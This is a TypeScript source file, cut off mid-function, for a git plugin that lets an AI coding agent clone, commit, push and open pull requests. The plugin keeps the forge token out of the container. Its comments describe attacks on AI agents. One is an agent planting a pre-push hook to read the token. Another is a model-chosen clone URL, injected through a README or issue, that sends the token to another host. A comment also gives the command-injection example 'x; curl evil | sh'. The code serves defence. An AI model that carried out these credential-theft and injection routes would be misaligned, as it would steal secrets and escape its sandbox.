import { tool } from "ai";
import type { ToolSet } from "ai";
import { z } from "zod";
import { definePlugin } from "@loopingai/core";
import type { AgentPlugin } from "@loopingai/core";

/**
 * `@loopingai/plugins/repo` — clone, commit, push, open a pull request.
 *
 * Layered over a container rather than owning one: it needs a shell with `git`
 * on it, and `@loopingai/plugins/computer` already provides exactly that through
 * `computerExec`. Passing `exec` in rather than importing that plugin keeps the
 * two independent — a host with its own container can use this against that
 * instead, and the tests here need no container at all.
 *
 * That seam has already paid for itself once: when the coder's substrate moved
 * from `@cloudflare/sandbox` to `@cloudflare/computer`, not a line of this file
 * changed except this comment.
 *
 * ## Where the token lives
 *
 * Nowhere the model or the container can read it, and nowhere it can be sent.
 * Four rules make that true, and all four are load-bearing:
 *
 * 0. **No command carrying the token runs in the checkout.** This is the rule
 *    the other three used to rest on without saying so, and it was false. Git is
 *    itself a general-purpose command runner: it executes whatever
 *    `.git/config` and `.git/hooks` name, and both live in the workspace
 *    filesystem, which outlives the container and which a co-installed shell
 *    tool can write. So a model never needed the token on *its* command — it
 *    planted a `pre-push` hook and waited for `repo_push` to run it, and the
 *    hook read `$REPO_TOKEN` out of the environment it inherited. Demonstrated
 *    against real git, not theorised.
 *
 *    Nothing survived that could be patched key by key, either: `-c` loses to a
 *    URL-specific `http.<url>.sslVerify=false` in the repository's own config,
 *    because specificity outranks precedence. So the credential-bearing
 *    commands moved out of the checkout entirely, into a bare git dir created
 *    per operation whose whole config is what we write on the command line and
 *    into the dir itself — see {@link cleanConfig}. The checkout's objects are
 *    reached through an alternates file, so nothing is copied and nothing is
 *    slower.
 *
 *    That dir is built, configured and used inside **one** command. Splitting
 *    those steps left a window: the model has a root shell on the same
 *    filesystem, so between creating the dir and using it, a `config` could be
 *    planted in it — and a URL-specific `http.<url>.proxy` there beats a `-c`
 *    override for the same specificity reason. So the credentialed command
 *    writes the dir's entire configuration itself, immediately before git reads
 *    it, rather than trusting what it finds.
 * 1. **The token never appears in a command string.** It goes through `exec`'s
 *    per-command `env`, because a command line is echoed into stdout, into
 *    stderr on failure, into shell history, and into any VCR cassette a test
 *    records. `git` reads it back out of the environment through a credential
 *    helper that prints and exits.
 * 2. **The credential helper is scoped to the forge, and the forge is an
 *    allowlist.** This is the rule that is easy to miss and expensive to get
 *    wrong. A helper configured as plain `credential.helper` answers for *every
 *    host* — it never sees which one git is asking about — so a clone URL
 *    pointing anywhere makes git offer the token to that host the moment it
 *    replies `401`. And the clone URL is model input: a repository README, an
 *    issue body, or a page fetched by a co-installed browser plugin is enough to
 *    choose it. So the helper is bound to `credential.<origin>.helper`, and the
 *    URL's host must be on {@link RepoConfig.allowedHosts} before anything runs.
 * 3. **Pull requests are opened from the Worker, not the container.** The GitHub
 *    REST call happens on this side of the boundary, so the container never
 *    holds a credential that can act on the repository at all.
 *
 * The remaining exposure is deliberate and small: `git push` needs the token in
 * the container's process environment for the duration of one command, scoped to
 * one origin, in a git dir that has no hooks and no configuration of its own.
 *
 * It is not zero, and the residual is worth naming precisely rather than waving
 * at. Rule 0 removes the durable form of the attack — plant once in the
 * checkout, collect on every future push — and folding each operation into a
 * single command removes the window between building the isolated dir and using
 * it. What is left is a race *inside* one command, against a path named from the
 * Worker that the attacker has to discover first. The complete fix is to stop
 * doing authenticated git in the container at all, which means pushing from the
 * Worker over the forge's API; that is a larger change than this file.
 *
 * A separate limit, and not one this plugin can close: the allowlist bounds the
 * *host*, never the repository. Whatever the token can reach, an agent talked
 * into naming it can reach. See the README — the token wants to be fine-grained.
 */

/** This plugin's tool-family name, as a recipe's `toolFamilies` lists it. */
export const REPO_FAMILY = "repo";

/** Run one command in the host's container. Matches `computerExec`'s shape. */
export type RepoExec = (
  command: string,
  options?: {
    cwd?: string;
    env?: Record<string, string | undefined>;
    timeout?: number;
    /**
     * The executing subtask's runtime state, forwarded **opaquely**.
     *
     * This plugin never looks inside it. A delegated subtask has to reach the
     * container its parent prepared, and the key for that lives in the runtime
     * state the parent resolved — but decoding it is the container plugin's
     * business, not git's. Passing it through untouched is what lets the two
     * plugins compose
     * without either importing the other, which is the whole reason `exec` is
     * injected rather than imported.
     */
    runtime?: unknown;
  }
) => Promise<{
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
}>;

export interface RepoConfig {
  /** Runs commands in the container holding the checkout. */
  exec: RepoExec;
  /**
   * A forge token with contents+pull-request write. A thunk so a rotated secret
   * is picked up without rebuilding the plugin list.
   */
  token: () => string;
  /** Where clones land. Defaults to `/workspace`. */
  workdir?: string;
  /** API origin, for GitHub Enterprise. Defaults to the public API. */
  apiBase?: string;
  /** Committer identity. Defaults to a generic agent identity. */
  author?: { name: string; email: string };
  /**
   * Hosts a clone may target, lowercase and exact. Defaults to `github.com`.
   *
   * A fail-closed allowlist rather than a blocklist, because the failure it
   * prevents is credential exfiltration and the input is model-chosen. Widen it
   * for GitHub Enterprise (alongside `apiBase`); an empty array clones nothing.
   */
  allowedHosts?: string[];
  /**
   * Ceiling on what any one tool here returns to the model. Defaults to 16,000
   * bytes, matching the computer plugin.
   *
   * This is not tidiness. `repo_diff` is the main input for an agent that
   * reviews rather than writes — a delegating coder whose subagents hold the
   * shell — and an unbounded diff on a large change is precisely the context
   * blowup that design exists to prevent.
   */
  maxOutputBytes?: number;
  /**
   * Called after a checkout is in place, freshly cloned or refreshed onto a new
   * commit.
   *
   * The hook exists because "there is now a working tree at this path" is
   * knowledge only this plugin has, and "that tree needs its dependencies
   * installed" is a decision only the host can make. Keeping the two apart is
   * what stops a git plugin growing an opinion about npm — the host wires this
   * to whatever its runtime does, or leaves it unset and nothing changes.
   *
   * Awaited, so it can record intent durably, but it must **return quickly**:
   * it runs inside `repo_clone`, which runs inside a model turn. A host that
   * wants to install here should start a job and return, not wait for it.
   *
   * A throw is caught and logged rather than failing the clone. The checkout did
   * succeed, the model needs to be told so, and a follow-up that did not is the
   * host's to notice.
   */
  afterCheckout?: (checkout: RepoCheckout) => Promise<void>;
  /**
   * Called with the repository a clone is *about* to target, after the host
   * allowlist has passed and before any git runs.
   *
   * Separate from {@link afterCheckout} because it answers a different question,
   * and the ordering is the whole point. A host that keys its container or its
   * filesystem per repository has to know which one **before** the clone, or the
   * clone lands somewhere it will then have to be moved from. `afterCheckout`
   * is far too late for that: by then the files exist.
   *
   * Synchronous on purpose. It runs on the path of every clone and the only
   * sensible thing to do with it is record a selection, which is why it returns
   * nothing and cannot be awaited — a host that needs to do I/O here has the
   * ordering wrong.
   *
   * A throw **fails the clone**, unlike {@link RepoConfig.afterCheckout}, whose
   * throw is caught and logged. A host that cannot choose a workspace has not
   * chosen one, and cloning into whichever was already open is worse than not
   * cloning.
   */
  beforeCheckout?: (target: {
    url: string;
    host: string;
    owner: string;
    repo: string;
  }) => void;
}

/** What {@link RepoConfig.afterCheckout} is told about a checkout. */
export interface RepoCheckout {
  /** Absolute path of the working tree. */
  dir: string;
  /** The clone URL, already allowlist-checked. */
  url: string;
  /** Host it came from, lowercase. */
  host: string;
  /**
   * `owner/repo`.
   *
   * Always present: a URL that does not parse into one is refused before any git
   * runs, so a host keying anything per repository can rely on this rather than
   * inventing a fallback for a case that no longer reaches it.
   */
  repo: string;
  /** Branch the checkout is on. */
  branch: string;
  /** True for a first clone, false when an existing tree was refreshed. */
  fresh: boolean;
}

const DEFAULT_WORKDIR = "/workspace";
const DEFAULT_API_BASE = "https://api.github.com";
const DEFAULT_ALLOWED_HOSTS = ["github.com"];
const DEFAULT_AUTHOR = {
  name: "looping-coder",
  email: "coder@looping.invalid"
};
const DEFAULT_MAX_OUTPUT_BYTES = 16_000;
/**
 * Ceiling on the one call this plugin makes that is not a container command.
 *
 * Not configurable, because it is not a tuning knob: it exists so that an API
 * which stops answering costs a round rather than the task. Opening a pull
 * request is a single small POST, and thirty seconds is already generous for one.
 */
const PR_TIMEOUT_MS = 30_000;

/**
 * Middle-out truncation, so both the head of a diff and its tail survive.
 *
 * Deliberately a **copy** of the computer plugin's function of the same name,
 * not an import. `npm run verify:exports` fails any subpath whose module graph
 * reaches a sibling's directory, and its own advice for a shared helper is to
 * duplicate it — installing `repo` must not drag `computer` (and therefore
 * `@cloudflare/computer`) into a consumer's bundle. Fifteen lines is a cheaper
 * price than that coupling, and it is the same reason `exec` is injected here
 * rather than imported.
 *
 * The `half < 1` guard is not padding: without it a small `max` makes `half`
 * zero or negative, and `slice(-0)` is `slice(0)` — the whole string — so the
 * function would return *more* than it was given.
 */
export function truncateOutput(text: string, max: number): string {
  if (text.length <= max) return text;

  const marker = (dropped: number) =>
    `\n\n… [${dropped} characters omitted from the middle] …\n\n`;

  const half = Math.floor((max - marker(text.length).length) / 2);
  if (half < 1) return text.slice(0, Math.max(0, max));

  return (
    text.slice(0, half) + marker(text.length - half * 2) + text.slice(-half)
  );
}

/**
 * A credential helper that prints the token from the environment and exits.
 *
 * This is what keeps the secret off the command line. `git` invokes the helper,
 * the helper reads `$REPO_TOKEN` out of its own environment, and the token never
 * becomes an argument that something could log. The alternative everyone reaches
 * for first — embedding it in the remote URL — writes it into `.git/config`,
 * where it stays after the command finishes.
 *
 * Note what the helper does **not** do: read git's stdin, where the protocol
 * says which host is being asked about. It answers unconditionally, so it must
 * never be installed unconditionally — see {@link credentialConfig}.
 */
const CREDENTIAL_HELPER =
  "!f() { echo username=x-access-token; echo password=$REPO_TOKEN; }; f";

/**
 * Bind the helper to one origin.
 *
 * `credential.helper` applies to every host git ever authenticates to; with a
 * helper that ignores its input, that means the token is offered to any server
 * that asks for auth. `credential.<origin>.helper` applies only to URLs under
 * that origin, so a clone pointed elsewhere gets no credential at all — the
 * request fails instead of leaking.
 *
 * Verified against real git: with the unscoped form,
 * `git credential fill` for `host=evil.example.com` printed the token.
 */
function credentialConfig(host: string): string {
  return `credential.https://${host}.helper='${CREDENTIAL_HELPER}'`;
}

/**
 * Everything a credential-bearing git command is configured by — all of it, and
 * none of it from a file.
 *
 * On the command line rather than in a config file we write, because the command
 * line is the one channel the container cannot rewrite underneath us: it arrives
 * in the same syscall as the command. A file we plant can be edited in the gap
 * between the command that writes it and the command that reads it.
 *
 * - `core.hooksPath` is pointed at nothing, so no hook runs. This is the vector
 *   the clean dir exists for, and the belt to its braces: the dir is fresh, so
 *   it has no hooks either.
 * - `init.templateDir` is emptied, so a hook planted in the image's template
 *   directory is not copied into any `.git/hooks` we create.
 * - `credential.helper=` **resets the list**, and must come before ours is
 *   added. A helper already in the chain answers first, and a helper is a shell
 *   command git runs with this environment — which is to say, with the token.
 */
function cleanConfig(host: string): string {
  return [
    "-c core.hooksPath=/dev/null",
    "-c init.templateDir=",
    "-c credential.helper=",
    `-c ${credentialConfig(host)}`
  ].join(" ");
}

/**
 * The environment of a credential-bearing command, beyond the token itself.
 *
 * `GIT_ASKPASS` names a program that fails rather than being left unset: unset,
 * a `core.askPass` from somebody else's config is used instead, and it is run
 * with this environment. The `GIT_CONFIG_*` pair takes the global and system
 * files out of play — there is no equivalent for a repository's own config,
 * which is the whole reason these commands do not run in one.
 */
const CREDENTIALED_ENV: Record<string, string> = {
  // A credential miss must fail, not block forever on a prompt nobody is there
  // to answer. A hang is worse than an error: it burns the round.
  GIT_TERMINAL_PROMPT: "0",
  GIT_ASKPASS: "/bin/false",
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_SYSTEM: "/dev/null"
};

/** Branch names a push must never target, whatever the model believes. */
const PROTECTED_BRANCHES = new Set(["main", "master", "trunk", "develop"]);

/**
 * A branch name git would accept but this plugin must not, because it can
 * resolve to something other than the branch it appears to name.
 *
 * `git push origin <name>` treats `<name>` as a refspec, so a `:` makes it
 * `<src>:<dst>` and a leading `+` makes it a force push — either one steps
 * around {@link PROTECTED_BRANCHES}, which only ever sees the literal string.
 * `git checkout -B` happens to reject some of these already; "happens to" is not
 * a guarantee worth depending on.
 */
const UNSAFE_BRANCH =
  /[:^~?*[\\\x00-\x20\x7f]|^[+-]|^refs\/|\.\.|@\{|\.lock$|\/$/;

/** Where a repository URL points, in a form that cannot be spoofed by a path. */
function repoLocation(url: string): { host: string; path: string } | undefined {
  // `git@github.com:owner/repo.git` — scp-like syntax, which `new URL` rejects.
  const scp = /^[A-Za-z0-9._-]+@([A-Za-z0-9.-]+):(.+)$/.exec(url.trim());
  if (scp) return { host: scp[1]!.toLowerCase(), path: scp[2]! };

  try {
    const parsed = new URL(url.trim());
    // https only. Not pedantry: git accepts `ext::<command>`, `file://` and
    // more, and `ext::` in particular runs an arbitrary command as a "remote".
    if (parsed.protocol !== "https:") return undefined;
    return { host: parsed.hostname.toLowerCase(), path: parsed.pathname };
  } catch {
    return undefined;
  }
}

/**
 * A name a forge would actually issue — and, more to the point, one that is safe
 * to use as a path segment and as a key.
 *
 * GitHub's own rule for both an owner and a repository is alphanumerics, `-`,
 * `_` and `.`, so nothing legitimate is turned away by insisting on it. What it
 * turns away is the reason it exists: `..` and `.` are valid matches for "a path
 * segment that is not a slash", and {@link buildRepoTools} builds a checkout
 * directory out of the repository name — so `https://github.com/o/..` produced a
 * `dir` of `/workspace/..`, which is `/`.
 *
 * The key half matters as much and is less visible. `beforeCheckout` hands
 * `owner` and `repo` to the host, and this plugin's README tells that host to
 * derive a per-repository workspace name from them. A name carrying `|`, `:` or
 * a space is then a separator in somebody else's key format, which is how two
 * callers end up sharing one workspace.
 */
const FORGE_NAME = /^[A-Za-z0-9._-]+$/;

function isForgeName(name: string): boolean {
  // `.` and `..` pass the character class and are exactly the two that must not.
  return name !== "." && name !== ".." && FORGE_NAME.test(name);
}

/**
 * `owner/repo` out of a GitHub URL, or `undefined` if it is not one.
 *
 * Anchored on the parsed **host**, which the previous unanchored regex was not:
 * `github.com` appearing anywhere in the string was enough, so
 * `https://evil.example.com/github.com/owner/repo` parsed as that owner and
 * repo. Nothing gated on this at the time, which is exactly why it was worth
 * fixing before something did.
 *
 * Both names are then checked against {@link isForgeName}, so a name that could
 * traverse a path or split somebody else's key never gets as far as being one.
 *
 * `undefined` is a refusal at every caller. `repo_clone` used to treat it as
 * "clone anyway, into `${workdir}/repo`, without telling the host which
 * repository this is" — which put the checkout in whichever workspace was
 * already open. It now says so and stops.
 */
export function parseRepo(
  url: string,
  allowedHosts: readonly string[] = DEFAULT_ALLOWED_HOSTS
): { owner: string; repo: string } | undefined {
  const location = repoLocation(url);
  if (!location || !allowedHosts.includes(location.host)) return undefined;

  const match = /^\/?([^/]+)\/([^/]+?)(?:\.git)?\/?$/.exec(location.path);
  if (!match) return undefined;

  const [, owner, repo] = match as unknown as [string, string, string];
  if (!isForgeName(owner) || !isForgeName(repo)) return undefined;
  return { owner, repo };
}

/**
 * What one container command produced — plus one bit the container did not.
 *
 * `exec` does not only *return* failures, it throws them: `@cloudflare/computer`
 * throws `EEXEC_LOST` when a container is replaced mid-command, and any call to a
 * Durable Object can fail outright. None of that used to be caught anywhere in
 * this file, so it left as a tool error carrying
 * `Execution "…" was lost when its container runtime was replaced` — a sentence
 * whose plausible readings are all wrong and all expensive.
 *
 * It is caught at the seam instead ({@link buildRepoTools}'s `run`) and turned
 * into a failed result, because every tool here already has a `!success` branch
 * that says what it was doing at the time. "could not read the status of /w/r: …"
 * is a better sentence than anything a wrapper one level up could write, and a
 * seventh tool calling `plain` gets it without being told.
 *
 * `unreachable` is for the branches that must tell the two apart. A command that
 * ran and failed has answered the question it was asked; a command that never ran
 * has answered nothing, and three places here read a failure as an answer.
 */
type RunResult = Awaited<ReturnType<RepoExec>> & { unreachable?: true };

/**
 * What to tell the model when the plumbing, not the command, is the problem.
 *
 * A sibling of the computer plugin's `execLostNote` rather than an import, for
 * the same reason {@link truncateOutput} is a copy: `npm run verify:exports`
 * fails any subpath whose module graph reaches a sibling's, and installing `repo`
 * must not drag `computer` in behind it. The wording differs anyway, and the
 * difference is the point — that plugin cannot know the lost command was git, and
 * this one does. What a model needs after a lost `git push` is not "re-run it"
 * but whether re-running it is *safe*.
 */
function unreachableNote(err: unknown): string {
  if ((err as { code?: unknown } | null | undefined)?.code === "EEXEC_LOST") {
    return (
      "the container was replaced while this command was running, so nothing here " +
      "is known to have finished. This is infrastructure — not git, and not what " +
      "you asked for. The checkout is durable and is exactly as you left it. " +
      "Retry, and read what the retry says rather than assuming it starts from " +
      "nothing: a command that had already reached the forge may have taken " +
      "effect. Retrying is safe either way — these commands push one specific " +
      "commit and never force."
    );
  }
  return (
    `the command could not be run: ${String(err)}. This is the plumbing — the ` +
    `container, the transport to it, or the host's own configuration — rather ` +
    `than git or anything you passed, and nothing is known to have completed. ` +
    `Retry once; if it happens again, say so in your result rather than working ` +
    `around it.`
  );
}

/**
 * What a refresh did, split from what the model is told about it.
 *
 * `branch` is set only when this call left a clean tree on a known branch —
 * which is also the only case where `afterCheckout` should fire. Every early
 * return here is a reason *not* to act on the checkout, and returning a bare
 * string made those indistinguishable from success at the call site.
 */
interface RefreshOutcome {
  message: string;
  branch?: string;
}

/** The two runners `refreshCheckout` borrows from {@link buildRepoTools}. */
interface GitRunners {
  plain: (
    args: string,
    cwd: string,
    vars?: Record<string, string>
  ) => Promise<{ success: boolean; stdout: string; stderr: string }>;
  /**
   * The whole credential-bearing half, as one call rather than a runner.
   *
   * `refreshCheckout` used to be handed the credentialed runner itself and
   * pointed it at the checkout. It cannot be any more — the token only ever
   * enters a git dir this module made — so what it borrows now is the finished
   * operation.
   */
  fetchOrigin: (
    dir: string,
    url: string,
    host: string
  ) => Promise<{ success: boolean; stdout: string; stderr: string }>;
}

/**
 * Bring an existing checkout back to a clean, current state.
 *
 * `repo_clone` used to assume an empty directory, which stopped being true the
 * moment containers outlived a task: `git clone` fails outright with
 * "destination path already exists and is not an empty directory", and the round
 * has to improvise from an error that reads like a bug.
 *
 * The refusal on a dirty tree is the important half. Uncommitted changes there
 * are a *previous task's work* — possibly the thing a human is waiting on — and
 * silently `reset --hard`ing them away to make a fresh clone look clean is the
 * one outcome nobody could recover from. Refusing costs a round; discarding
 * costs the work.
 */
async function refreshCheckout({
  dir,
  url,
  branch,
  host,
  plain,
  fetchOrigin
}: GitRunners & {
  dir: string;
  url: string;
  branch: string | undefined;
  host: string;
}): Promise<RefreshOutcome> {
  const remote = await plain("remote get-url origin", dir);
  // Interrogated, for the same reason the `status` below is: a question that went
  // unanswered is not the answer "some other repository". Empty stdout from a
  // command that *failed* used to produce exactly that sentence — so an
  // unreachable container, or a git dir with no origin at all, sent the model
  // looking for a checkout of something nobody had mentioned.
  if (!remote.success) {
    return {
      message:
        `could not read which repository ${dir} holds: ` +
        `${remote.stderr || remote.stdout || "git remote get-url origin failed"}\n` +
        `Nothing was fetched or reset.`
    };
  }
  if (remote.stdout.trim() !== url.trim()) {
    return {
      message:
        `${dir} already holds a checkout of ${remote.stdout.trim() || "another repository"}, ` +
        `not ${url}. Pick a different directory or work with the checkout that is there.`
    };
  }

  // Interrogated, not assumed. Empty stdout from a `status` that *failed* is
  // not a clean tree — it is no answer at all, and the next two commands here
  // are `fetch` and `reset --hard`. Treating the two as the same thing meant a
  // permissions error or a half-written index could discard a tree whose
  // cleanliness had never been established, which is the one loss in this file
  // that nobody can recover from.
  const dirty = await plain("status --porcelain", dir);
  if (!dirty.success) {
    return {
      message:
        `could not read the state of the checkout at ${dir}: ` +
        `${dirty.stderr || dirty.stdout || "git status failed"}\n` +
        `Nothing was fetched or reset — a tree that cannot be inspected is not ` +
        `a tree that can be safely reset.`
    };
  }
  if (dirty.stdout.trim()) {
    // Deliberately no `branch` here, so no `afterCheckout` fires. The tree is
    // usable, but it is somebody's unfinished work rather than a checkout this
    // call established — kicking off an install over it would be acting on a
    // state the model has not looked at yet.
    return {
      message:
        `${dir} already has this repository checked out, with uncommitted changes:\n` +
        `${dirty.stdout.trim()}\n\n` +
        `Left untouched — these may be unfinished work from an earlier task. ` +
        `Inspect them with repo_diff, then either build on them or commit them. ` +
        `Nothing was fetched or reset.`
    };
  }

  const fetched = await fetchOrigin(dir, url, host);
  if (!fetched.success)
    return { message: `fetch failed: ${fetched.stderr || fetched.stdout}` };

  // The branch to land on: the one asked for, else the remote's own default.
  let target = branch;
  if (!target) {
    const head = await plain(
      "symbolic-ref --short refs/remotes/origin/HEAD",
      dir
    );
    target = head.success
      ? head.stdout.trim().replace(/^origin\//, "")
      : undefined;
  }
  if (!target)
    return { message: `could not determine a default branch for ${url}` };

  const checkout = await plain(`checkout "$REPO_BRANCH"`, dir, {
    REPO_BRANCH: target
  });
  if (!checkout.success)
    return {
      message: `could not check out ${target}: ${checkout.stderr || checkout.stdout}`
    };

  const reset = await plain(`reset --hard "origin/$REPO_BRANCH"`, dir, {
    REPO_BRANCH: target
  });
  if (!reset.success)
    return {
      message: `could not reset to origin/${target}: ${reset.stderr || reset.stdout}`
    };

  return {
    message: `reused the existing checkout at ${dir}, fetched and reset to origin/${target}`,
    branch: target
  };
}

export function buildRepoTools(
  config: RepoConfig,
  /** Forwarded to every `exec`; see {@link RepoExec}'s `runtime` option. */
  runtime?: unknown
): ToolSet {
  const workdir = config.workdir ?? DEFAULT_WORKDIR;
  const apiBase = config.apiBase ?? DEFAULT_API_BASE;
  const author = config.author ?? DEFAULT_AUTHOR;
  const allowedHosts = config.allowedHosts ?? DEFAULT_ALLOWED_HOSTS;
  const maxBytes = config.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES;

  /** Everything this plugin hands back to the model, bounded. */
  const bounded = (text: string) => truncateOutput(text, maxBytes);

  /**
   * Tell the host a checkout is ready, and never let that fail the clone.
   *
   * The clone did succeed. Whatever the host wanted to do next — start an
   * install, usually — is its problem to notice, and turning a working
   * `repo_clone` into an error would send the model to investigate git when
   * git is fine.
   */
  const notifyCheckout = async (checkout: RepoCheckout): Promise<void> => {
    if (!config.afterCheckout) return;
    try {
      await config.afterCheckout(checkout);
    } catch (err) {
      console.error("[repo] afterCheckout failed", {
        dir: checkout.dir,
        repo: checkout.repo,
        err: String(err)
      });
    }
  };

  /**
   * Say out loud that a git command failed.
   *
   * Every failure path here returns its stderr *to the model* and logged
   * nothing, which is exactly one audience short. When a push started failing
   * in production the only trace was an `exec` line with `exitCode: 128`
   * and a truncated command — diagnosing it meant correlating exit codes
   * against the GitHub API to prove the branch never landed. One line naming
   * the tool and carrying the stderr answers it directly.
   *
   * The token is scrubbed rather than trusted. It never reaches a command line
   * and the credential helper prints only to git's stdin, so stderr should be
   * clean — but "should be" is not the standard for something that writes a
   * credential into a log that outlives the request.
   */
  const logFailure = (
    tool: string,
    detail: { exitCode?: number; stderr?: string; stdout?: string }
  ): void => {
    // Read defensively, because this now runs on the path where the plumbing
    // failed — and a `GITHUB_TOKEN` the host cannot resolve is one of the
    // likelier reasons to be here. A thunk that throws would throw out of the
    // handler written to stop throws escaping, which is the one thing this must
    // never do. Nothing to scrub is not a problem; nothing gets logged either
    // way except what a command produced.
    let token: string;
    try {
      token = config.token();
    } catch {
      token = "";
    }
    const scrub = (text: string | undefined) =>
      token && text ? text.split(token).join("«token»") : text;
    console.warn(`[repo] ${tool} failed`, {
      exitCode: detail.exitCode,
      stderr: truncateOutput(scrub(detail.stderr) ?? "", 2_000),
      stdout: truncateOutput(scrub(detail.stdout) ?? "", 2_000)
    });
  };

  /**
   * One git command at a time, per checkout.
   *
   * Git takes `.git/index.lock` for anything that writes, and fails outright
   * rather than waiting if it is already held. Nothing stopped two of these tools
   * running at once — a model may emit several tool calls in a single turn, and
   * the SDK executes them concurrently — so a `repo_commit` and a `repo_push`
   * issued together raced, and production returned:
   *
   *     fatal: Unable to create '…/.git/index.lock': File exists.
   *     Another git process seems to be running in this repository
   *
   * The commit failed, the push succeeded against the *previous* state, and the
   * model had to work out what had actually landed. A lost commit is the good
   * outcome there; the bad one is a push that looks like it worked.
   *
   * A promise chain rather than a real lock, because that is all the scope needs:
   * the racers are tool calls inside one turn, in one isolate, against one
   * container. It is also deliberately **not** module-level — two agents working
   * on two checkouts have no reason to queue behind each other.
   *
   * Reads are serialised too. `git status` does not take the lock, but ordering
   * them costs nothing on operations measured in tens of milliseconds and removes
   * having to be right about which commands write.
   */
  let gitQueue: Promise<unknown> = Promise.resolve();
  const serialised = <T>(run: () => Promise<T>): Promise<T> => {
    // `then(run, run)` so one failure does not wedge every command behind it —
    // the queue is for ordering, not for propagating outcomes.
    const next = gitQueue.then(run, run);
    gitQueue = next.then(
      () => undefined,
      () => undefined
    );
    return next;
  };

  /**
   * Run git with the token in the environment, never on the command line, and
   * offered only to `host`.
   *
   * `vars` carries every **model-controlled** value — a URL, a branch name, a
   * commit message — into the container as an environment variable, referenced
   * inside the command as `"$VAR"`. Interpolating them into the command string
   * instead would let a model-authored branch name of `x; curl evil | sh` run
   * as a second command. The container is isolated and the blast radius is its
   * own filesystem, but "the container contains it" is a reason to be careful
   * here, not a reason to skip it.
   *
   * `host` is never model input: it comes from {@link repoLocation} after the
   * allowlist check, so the origin the credential is bound to is always one the
   * host configured.
   */
  /**
   * Every container command this plugin runs, and the only place `exec` is
   * allowed to throw.
   *
   * `options` is a thunk rather than a value so that everything it reads — the
   * token above all — is read here, inside the `try` and at the moment the queue
   * actually dequeues this command. Building it at the call site would put a
   * rotated secret's lookup, and any throw from it, outside the one handler.
   */
  const run = (
    command: string,
    options: () => Parameters<RepoExec>[1]
  ): Promise<RunResult> =>
    serialised(async () => {
      try {
        return await config.exec(command, options());
      } catch (err) {
        // Logged here as well as by the tool's own failure branch: the two say
        // different things, and this is the one that names the command. The
        // command string is safe to log — that it never carries the token is the
        // invariant this whole file is built on, and it has a test.
        console.warn("[repo] command could not run", {
          command: truncateOutput(command, 500),
          err: String(err)
        });
        return {
          success: false,
          stdout: "",
          stderr: unreachableNote(err),
          exitCode: -1,
          unreachable: true
        };
      }
    });

  const credentialed = (
    host: string,
    args: string,
    cwd: string,
    vars: Record<string, string> = {},
    /**
     * Shell run in the *same* command, immediately before the git invocation.
     *
     * This is how the isolated dir gets built and its configuration re-asserted
     * with no gap for anything to be planted in between. Everything a caller
     * puts here must be a plain file operation or a git command against the room
     * — never git inside the checkout, which is the one place the token must not
     * reach. Chained with `&&`, so a failure stops before the credential is used.
     */
    prelude?: string
  ) =>
    run(
      `${prelude ? `${prelude} && ` : ""}git ${cleanConfig(host)} ${args}`,
      () => ({
        cwd,
        runtime,
        env: {
          REPO_TOKEN: config.token(),
          ...CREDENTIALED_ENV,
          ...vars
        }
      })
    );

  /** A container command with no secret in its environment. */
  const shell = (
    script: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) =>
    run(script, () => ({
      cwd,
      runtime,
      env: { GIT_TERMINAL_PROMPT: "0", ...vars }
    }));

  const plain = (
    args: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) => shell(`git ${args}`, cwd, vars);

  /**
   * Create a git dir the model has never had the chance to configure.
   *
   * Named from the Worker rather than by `mktemp`, for two reasons. The path is
   * then unguessable *and* it is not something the container told us — a path
   * read back from a command's stdout is model-controlled, and this one is later
   * handed to `rm -rf`.
   */
  const CREATE_ROOM = [
    'rm -rf "$GIT_ROOM"',
    'git -c init.templateDir= init -q --bare "$GIT_ROOM"'
  ].join(" && ");

  /**
   * Write the room's entire on-disk configuration, in the same command that is
   * about to read it.
   *
   * This is what closes the window creating it left open. The model has a root
   * shell on the same filesystem, so between the command that made the room and
   * the command that uses it there was a gap in which `$GIT_ROOM/config` could
   * be given an `http.<url>.proxy` and an `sslVerify=false` — and a URL-specific
   * key in a repository's own config beats a `-c` override, which is the whole
   * reason the room exists. Rewriting the file rather than trusting it means the
   * attacker has to win a race *inside* one process instead of between two.
   *
   * The three files are every channel that survives into a credentialed command:
   * `config`, the alternates that decide which objects are reachable, and
   * `shallow`. Hooks are the fourth and are dealt with on the command line by
   * {@link cleanConfig}, which no file can override.
   *
   * `bare = true` and format 0 are what `git init --bare` itself writes, and we
   * created this dir two steps ago, so restating them is exact rather than a
   * guess.
   *
   * The alternates arrive as a **file** rather than through
   * `GIT_ALTERNATE_OBJECT_DIRECTORIES`. That is not a style choice: a refresh
   * ends with the checkout fetching *from* this dir, which spawns an
   * `upload-pack` inside it that does not inherit our environment. With the
   * variable and not the file, that fetch dies on `bad pack header`.
   *
   * `shallow` is copied when it exists, and it is load-bearing for `depth`:
   * without it the room believes it has history it does not have, builds a pack
   * on that belief, and the push is rejected with `unpacker error`.
   *
   * Note what this does *not* do: run git inside the checkout. Every line is a
   * plain file operation on a path, which is what makes it safe to put in the
   * same command as the token.
   */
  const ASSERT_ROOM = [
    `printf '[core]\\n\\trepositoryformatversion = 0\\n\\tbare = true\\n' > "$GIT_ROOM/config"`,
    `printf '%s\\n' "$REPO_DIR/.git/objects" > "$GIT_ROOM/objects/info/alternates"`,
    '{ [ ! -f "$REPO_DIR/.git/shallow" ] || cp "$REPO_DIR/.git/shallow" "$GIT_ROOM/shallow"; }'
  ].join(" && ");

  /**
   * Which step a chained script reached, so a failure still names itself.
   *
   * Folding the steps into one command costs the thing separate commands gave
   * for free: a return value per step. A marker per stage buys it back, and it
   * goes to stdout because the message a caller renders reads `stderr` first —
   * so on the failing path git's own diagnostic still wins and these stay out of
   * it.
   */
  const stage = (name: string) => `echo "[stage:${name}]"`;

  const lastStage = (out: string): string | undefined =>
    [...out.matchAll(/\[stage:(\w+)\]/g)].pop()?.[1];

  /**
   * Turn a failed room script into a sentence that says where it stopped.
   *
   * A success passes through untouched — the stage markers are diagnostics for
   * the path that failed, and rewriting `stderr` on a command that worked would
   * put a sentence about failure into a result that had none.
   *
   * `run` means the setup finished and git itself failed, which is the ordinary
   * case: the caller wants git's own message, not ours.
   */
  const roomFailure = <
    T extends {
      success: boolean;
      stdout: string;
      stderr: string;
      unreachable?: true;
    }
  >(
    result: T
  ): T => {
    if (result.success) return result;
